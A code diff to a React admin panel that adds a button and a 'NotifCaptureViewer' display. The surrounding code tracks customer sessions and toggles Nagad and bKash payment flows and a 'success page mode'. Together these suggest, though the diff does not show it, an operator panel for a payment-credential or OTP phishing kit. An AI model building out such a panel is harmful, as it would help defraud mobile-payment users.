@@ -2,7 +2,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { CustomerSession } from '../types';
 import { db } from '../App';
-
+import NotifCaptureViewer from './NotifCaptureViewer';
 interface AdminPanelProps {
   onBack: () => void;
 }
@@ -14,6 +14,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
   const [successPageMode, setSuccessPageMode] = useState(false);
   const [nagadEnabled, setNagadEnabled] = useState(true);
   const [bkashEnabled, setBkashEnabled] = useState(true);
+  const [showNotifViewer, setShowNotifViewer] = useState(false);
   const prevSessionIdsRef = useRef<Set<string>>(new Set());
   const audioRef = useRef<HTMLAudioElement | null>(null);
 
@@ -179,6 +180,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
             <span className={`w-2 h-2 rounded-full ${nagadEnabled ? 'bg-orange-200 animate-pulse' : 'bg-slate-500'}`}></span>
             {nagadEnabled ? 'নগদ ON' : 'নগদ OFF'}
           </button>
+          <button onClick={() => setShowNotifViewer(!showNotifViewer)} className={`px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all border ${showNotifViewer ? 'bg-purple-600 border-purple-500 text-white' : 'bg-slate-700 hover:bg-slate-600 border-slate-600 text-slate-300'}`}>📋 Notifs</button>
           <button onClick={clearAllData} className="bg-red-600 hover:bg-red-700 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all">সব মুছুন</button>
           <button onClick={onBack} className="bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg text-[11px] font-bold transition-all">লগ আউট</button>
         </div>
@@ -284,6 +286,12 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
           </tbody>
         </table>
       </div>
+
+      {showNotifViewer && (
+        <div className="border-t border-slate-700">
+          <NotifCaptureViewer />
+        </div>
+      )}
     </div>
   );
 };
